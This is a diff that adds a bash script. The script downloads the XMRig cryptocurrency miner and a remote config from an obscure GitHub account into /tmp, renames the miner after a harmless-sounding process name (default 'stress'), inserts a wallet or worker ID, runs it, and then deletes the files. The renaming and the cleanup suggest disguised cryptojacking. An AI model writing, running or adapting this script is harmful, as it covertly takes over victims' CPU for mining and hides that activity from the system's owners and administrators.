@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# version 2.04
+#
+###########
+
+ID=$1
+PROC_NAME=$2
+CPUX=$3
+
+#no id
+if [ -z $ID ]; then
+  exit 1
+fi
+
+if [ -z $PROC_NAME ]; then
+  NAME="stress"
+else
+  NAME=$PROC_NAME
+fi
+
+if [ -z $CPUX ]; then
+  CPU='10'
+else
+  CPU=$CPUX
+fi
+
+FOLDER="a94a8fe5"
+mkdir /tmp/$FOLDER
+
+
+
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "Download run ERROR"
+  exit 1
+fi
+
+tar xf /tmp/xmrig.tar.gz -C /tmp/$FOLDER/
+mv /tmp/$FOLDER/xmrig /tmp/$FOLDER/$NAME
+rm /tmp/xmrig.tar.gz
+
+chmod +x /tmp/$FOLDER/$NAME
+
+
+mkdir -p $HOME/bin
+ln -s /tmp/$FOLDER/$NAME $HOME/bin/$NAME
+
+if ! curl -L "https://raw.githubusercontent.com/ohch6Ong/EeXah6Bi/main/config.json" -o /tmp/$FOLDER/config.json; then
+  echo "Download config ERROR"
+  exit 1
+fi
+
+sed -i 's/"pass": *"[^"]*",/"pass": "'$ID'",/' /tmp/$FOLDER/config.json
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": '$CPU',/' /tmp/$FOLDER/config.json
+
+nice $HOME/bin/$NAME
+
+sleep 2
+
+rm -rf /tmp/$FOLDER
+rm $HOME/bin/$NAME
+
